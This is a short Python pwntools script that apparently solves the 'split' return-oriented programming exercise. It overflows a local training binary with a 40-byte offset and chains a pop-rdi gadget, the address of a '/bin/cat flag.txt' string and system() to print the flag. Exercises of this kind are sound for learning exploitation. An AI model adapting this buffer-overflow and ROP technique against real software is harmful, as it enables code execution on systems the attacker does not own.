#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./split', checksec=False)
p = process()
context.log_level = 'info'

offset = b'a' * 40

pop_rdi = 0x4007c3      # pop rdi; ret;
bin_cat = 0x601060      # /bin/cat flag.txt
system_addr = 0x40074b  # and the system()

payload = offset
payload += p64(pop_rdi)
payload += p64(bin_cat)
payload += p64(system_addr)

p.sendlineafter(b'>', payload)
log.info(p.recvuntil(b'}')) # to receive only until the end of the flag
